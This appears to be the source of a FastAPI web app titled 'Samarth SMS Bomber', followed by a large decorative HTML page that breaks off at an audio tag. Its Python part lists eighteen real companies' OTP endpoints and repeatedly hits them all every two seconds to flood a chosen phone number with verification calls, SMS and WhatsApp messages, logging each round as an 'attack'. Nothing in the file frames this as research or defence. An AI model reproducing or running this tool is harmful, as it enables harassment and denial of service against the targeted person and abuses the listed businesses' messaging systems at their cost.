from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
import json
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === COMPLETE API LIST FROM YOUR BOT ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {"name": "Wakefit SMS", "type": "SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hungama OTP", "type": "SMS", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "Doubtnut", "type": "SMS", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'},
    {"name": "PenPencil", "type": "SMS", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'},
    {"name": "BeepKart", "type": "SMS", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}'},
    {"name": "Housing.com", "type": "SMS", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'},
    {"name": "Khatabook", "type": "SMS", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'},
    {"name": "Rappi WhatsApp", "type": "WhatsApp", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'},
    {"name": "Eka Care WhatsApp", "type": "WhatsApp", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'},
]

attack_status = {
    "running": False,
    "phone": None,
    "cycles": 0,
    "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0},
    "logs": [],
    "start_time": None,
    "duration": None,
    "export_data": []
}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 50:
        attack_status["logs"].pop()
    attack_status["export_data"].append({
        "timestamp": datetime.now().strftime('%H:%M:%S'),
        "message": msg
    })

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(
            method=api["method"],
            url=api["url"],
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False
        ) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
                return True
    except:
        pass
    return False

async def run_attack(phone, duration=None):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    attack_status["start_time"] = datetime.now()
    attack_status["duration"] = duration
    attack_status["export_data"] = []
    add_log(f"🚀 Attack initiated on +91{phone}")
    if duration:
        add_log(f"⏱️ Timer set for {duration} seconds")

    async with aiohttp.ClientSession() as session:
        start_time = datetime.now()
        while attack_status["running"]:
            if duration:
                elapsed = (datetime.now() - start_time).total_seconds()
                if elapsed >= duration:
                    add_log(f"⏰ Timer expired after {duration}s")
                    attack_status["running"] = False
                    break
            
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Samarth SMS Bomber | Stadium Royale</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Uncial+Antiqua&family=Cinzel:wght@400;600;700;900&family=Orbitron:wght@400;700;800;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cinzel', 'Orbitron', serif;
            background: #0a0a1a;
            min-height: 100vh;
            overflow-x: hidden;
            color: #f0f0ff;
            position: relative;
        }
        /* Cosmic Background */
        .cosmic-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(ellipse at 20% 50%, rgba(30, 58, 138, 0.4) 0%, transparent 60%),
                        radial-gradient(ellipse at 80% 50%, rgba(37, 99, 235, 0.3) 0%, transparent 60%),
                        radial-gradient(ellipse at 50% 100%, rgba(99, 102, 241, 0.2) 0%, transparent 50%),
                        #0a0a1a;
            z-index: 0;
            overflow: hidden;
        }
        /* Stars */
        .stars {
            position: absolute;
            width: 2px;
            height: 2px;
            background: white;
            border-radius: 50%;
            animation: twinkle 3s infinite alternate;
        }
        @keyframes twinkle {
            0% { opacity: 0.2; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1.2); }
        }
        /* Nebula clouds */
        .nebula {
            position: absolute;
            border-radius: 50%;
            filter: blur(100px);
            opacity: 0.2;
            animation: drift 20s infinite alternate ease-in-out;
        }
        @keyframes drift {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(30%, 20%) scale(1.3); }
        }
        /* Glow rings */
        .glow-ring {
            position: absolute;
            border-radius: 50%;
            border: 1px solid rgba(59, 130, 246, 0.1);
            box-shadow: 0 0 40px rgba(59, 130, 246, 0.05);
            animation: pulse-ring 6s infinite alternate;
        }
        @keyframes pulse-ring {
            0% { transform: scale(1); opacity: 0.3; }
            100% { transform: scale(1.5); opacity: 0.8; }
        }

        /* Glassmorphism Grand */
        .glass-grand {
            background: rgba(10, 10, 30, 0.6);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(56, 189, 248, 0.15);
            box-shadow: 0 30px 60px -20px rgba(0,0,0,0.8), inset 0 0 80px rgba(37,99,235,0.05);
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
        }
        .glass-grand::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(59,130,246,0.03), transparent, rgba(251,191,36,0.03), transparent);
            animation: rotate-glow 20s linear infinite;
        }
        @keyframes rotate-glow {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Titles */
        .title-grand {
            font-family: 'Uncial Antiqua', 'Cinzel', serif;
            font-size: 4rem;
            font-weight: 900;
            text-shadow: 0 0 30px rgba(59,130,246,0.5), 0 0 60px rgba(59,130,246,0.3), 0 0 120px rgba(59,130,246,0.1);
            background: linear-gradient(135deg, #60a5fa, #fbbf24, #60a5fa);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer-title 6s ease-in-out infinite;
        }
        @keyframes shimmer-title {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        .subtitle-grand {
            font-family: 'Orbitron', monospace;
            letter-spacing: 0.5em;
            text-shadow: 0 0 20px rgba(251,191,36,0.3);
            color: #fbbf24;
            font-size: 0.9rem;
            font-weight: 700;
        }

        /* Inputs */
        .input-grand {
            background: rgba(0, 0, 0, 0.7);
            border: 2px solid rgba(56, 189, 248, 0.2);
            border-radius: 16px;
            padding: 1.2rem 1.5rem 1.2rem 4.5rem;
            color: #f0f0ff;
            font-family: 'Orbitron', monospace;
            font-size: 1.5rem;
            letter-spacing: 0.1em;
            transition: all 0.4s ease;
            width: 100%;
            backdrop-filter: blur(10px);
        }
        .input-grand:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 40px rgba(59,130,246,0.3), inset 0 0 40px rgba(59,130,246,0.05);
            outline: none;
        }
        .input-grand::placeholder {
            color: rgba(148,163,184,0.2);
            font-size: 1rem;
        }

        /* Buttons */
        .btn-epic {
            background: linear-gradient(135deg, #1e3a8a, #2563eb);
            border: none;
            border-radius: 16px;
            padding: 1rem 2rem;
            font-family: 'Orbitron', monospace;
            font-weight: 700;
            letter-spacing: 0.1em;
            color: white;
            box-shadow: 0 0 40px rgba(37,99,235,0.4);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
            position: relative;
            overflow: hidden;
        }
        .btn-epic::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.15) 0%, transparent 60%);
            transform: scale(0);
            transition: transform 0.6s;
        }
        .btn-epic:hover::after {
            transform: scale(1);
        }
        .btn-epic:hover {
            transform: translateY(-4px) scale(1.02);
            box-shadow: 0 0 60px rgba(37,99,235,0.6), 0 0 120px rgba(37,99,235,0.2);
        }
        .btn-epic:active {
            transform: scale(0.98);
        }
        .btn-epic-danger {
            background: linear-gradient(135deg, #dc2626, #b91c1c);
            box-shadow: 0 0 40px rgba(239,68,68,0.3);
        }
        .btn-epic-danger:hover {
            box-shadow: 0 0 60px rgba(239,68,68,0.5);
        }

        /* Stats Cards */
        .stat-grand {
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(56,189,248,0.1);
            border-radius: 16px;
            padding: 1rem;
            text-align: center;
            transition: all 0.4s ease;
            position: relative;
        }
        .stat-grand:hover {
            border-color: rgba(59,130,246,0.3);
            transform: translateY(-5px);
            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.5);
        }
        .stat-number {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            font-size: 2.5rem;
            background: linear-gradient(135deg, #60a5fa, #fbbf24);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(59,130,246,0.2);
        }

        /* Progress bar */
        .progress-cosmic {
            height: 4px;
            background: rgba(255,255,255,0.05);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 0.5rem;
        }
        .progress-cosmic-fill {
            height: 100%;
            border-radius: 10px;
            background: linear-gradient(90deg, #3b82f6, #fbbf24);
            box-shadow: 0 0 20px rgba(59,130,246,0.5);
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
        }

        /* Logs */
        .logs-grand {
            scrollbar-width: thin;
            scrollbar-color: rgba(59,130,246,0.2) transparent;
            font-family: 'Orbitron', monospace;
            font-size: 0.7rem;
            max-height: 300px;
            overflow-y: auto;
            padding: 0.5rem;
        }
        .logs-grand::-webkit-scrollbar { width: 4px; }
        .logs-grand::-webkit-scrollbar-track { background: transparent; }
        .logs-grand::-webkit-scrollbar-thumb {
            background: rgba(59,130,246,0.3);
            border-radius: 10px;
        }
        .log-entry {
            padding: 0.3rem 0.8rem;
            border-left: 2px solid transparent;
            transition: all 0.2s;
            color: #94a3b8;
        }
        .log-entry:hover {
            background: rgba(59,130,246,0.05);
            border-left-color: #3b82f6;
            color: #e2e8f0;
        }

        /* Toggle */
        .toggle-grand {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            cursor: pointer;
            padding: 0.3rem 0.8rem;
            border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(0,0,0,0.3);
            transition: all 0.3s;
        }
        .toggle-grand:hover {
            background: rgba(255,255,255,0.05);
        }

        /* Timer display */
        .timer-grand {
            font-family: 'Orbitron', monospace;
            font-size: 1.2rem;
            text-shadow: 0 0 20px rgba(251,191,36,0.3);
            color: #fbbf24;
        }

        /* Heart overlay bigger */
        .heart-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(10px);
        }
        .heart-overlay.active {
            display: flex;
            animation: heartFade 3s ease-out forwards;
        }
        @keyframes heartFade {
            0% { opacity: 1; backdrop-filter: blur(20px); }
            70% { opacity: 1; backdrop-filter: blur(20px); }
            100% { opacity: 0; backdrop-filter: blur(0); }
        }
        .heart-container {
            position: relative;
            width: 400px;
            height: 400px;
            animation: heartPulse 0.5s ease-in-out 6;
        }
        @keyframes heartPulse {
            0%, 100% { transform: scale(1); }
            25% { transform: scale(1.2); }
            50% { transform: scale(1); }
            75% { transform: scale(1.1); }
        }
        .heart-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-family: 'Uncial Antiqua', serif;
            font-size: 4rem;
            color: #fbbf24;
            text-shadow: 0 0 40px rgba(251,191,36,0.8), 0 0 80px rgba(251,191,36,0.5), 0 0 120px rgba(251,191,36,0.3);
            z-index: 1;
            text-align: center;
            line-height: 1.2;
        }
        .heart-svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 60px rgba(239,68,68,0.8));
            animation: heartGlow 1s ease-in-out infinite alternate;
        }
        @keyframes heartGlow {
            0% { filter: drop-shadow(0 0 40px rgba(239,68,68,0.6)); }
            100% { filter: drop-shadow(0 0 100px rgba(239,68,68,0.9)); }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .title-grand { font-size: 2.5rem; }
            .input-grand { font-size: 1rem; padding-left: 3.5rem; }
            .stat-number { font-size: 1.8rem; }
            .heart-container { width: 250px; height: 250px; }
            .heart-text { font-size: 2.5rem; }
        }
    </style>
</head>
<body>

    <!-- Cosmic Background -->
    <div class="cosmic-bg" id="cosmicBg">
        <!-- Stars generated by JS -->
        <div id="starContainer"></div>
        <!-- Nebula -->
        <div class="nebula" style="width:600px;height:600px;background:radial-gradient(circle, #3b82f6, transparent);top:10%;left:5%;"></div>
        <div class="nebula" style="width:800px;height:800px;background:radial-gradient(circle, #fbbf24, transparent);bottom:10%;right:5%;"></div>
        <div class="nebula" style="width:500px;height:500px;background:radial-gradient(circle, #8b5cf6, transparent);top:50%;left:50%;transform:translate(-50%,-50%);"></div>
        <!-- Glow rings -->
        <div class="glow-ring" style="width:300px;height:300px;top:20%;left:80%;"></div>
        <div class="glow-ring" style="width:500px;height:500px;bottom:10%;left:10%;animation-delay:3s;"></div>
    </div>

    <!-- Heart Overlay -->
    <div class="heart-overlay" id="heartOverlay">
        <div class="heart-container">
            <svg class="heart-svg" viewBox="0 0 100 100">
                <defs>
                    <radialGradient id="heartGrad" cx="50%" cy="50%" r="50%">
                        <stop offset="0%" stop-color="#ef4444"/>
                        <stop offset="50%" stop-color="#dc2626"/>
                        <stop offset="100%" stop-color="#b91c1c"/>
                    </radialGradient>
                    <filter id="heartGlowFilter">
                        <feGaussianBlur stdDeviation="4" result="blur"/>
                        <feMerge>
                            <feMergeNode in="blur"/>
                            <feMergeNode in="SourceGraphic"/>
                        </feMerge>
                    </filter>
                </defs>
                <path d="M50 88 C20 65 0 50 0 35 C0 15 15 0 35 0 C45 0 50 8 50 8 C50 8 55 0 65 0 C85 0 100 15 100 35 C100 50 80 65 50 88Z"
                      fill="url(#heartGrad)" filter="url(#heartGlowFilter)" opacity="0.95"/>
            </svg>
            <div class="heart-text">⚡<br>ATTACK<br>LAUNCHED</div>
        </div>
    </div>

    <!-- Audio -->
    <audio id="wrongSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>
    <audio id="attackSound" preload="auto">
        <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFh4qAgICAf4mMjo6LgH6Af3t/gHp3doR/gXx2e3Z1c2dxc3NwZWNfXmNcU1hVU1dWU1BQUU1MSkVGRkpHSEZGQ0dDQkI+OjUyMy4rKScnJiMiHRsWGRIPDAkGBwMCAQABAgIDAwMCAgEBAQEBAQEBAgIDAgIDAgIDAwMDAwMEBAQEBQUFBQUGBgYGBwcHCAgJCQkJCwsLCwsLCwwMDA0NDQ4ODg8PDw8PDw8PDw8PDw8PDw8QDw8PDw4ODg0NDQwMDAwLCwsKCgoICQgHBwYGBgUEBAMDAwICAQEBAQEBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDxAPEA8PDw8PDw8PDw8OEA8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoKCQkJCQgHBwYGBgUFBAMDAwMCAgIBAQEBAQECAgIDAwMDAwQEBAUFBQYGBwcHCAgICQkJCgoLCwwMDA0ODQ4PDw8PDw8QDw8PDw8PDw8PDw4ODg4ODQ0NDQwMDAwLCwsLCgoJCQkICAcHBwYGBQUEBAMDAwMCAgEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBwcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PEA8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAQEBAQECAgIDAwMDAwQEBAUFBQUGBgcHCAgICQkJCgoLCwsLDAwMDQ0NDg4ODw8PDw8PDw8PDw4ODg4ODQ0NDQ0MDAwLCwsLCgoKCQkJCQgHBwcGBgUFBQQEAwMDAwICAQEBAA==">
        </source>
    </audio>
    <audio id="niceSound" preload="auto">
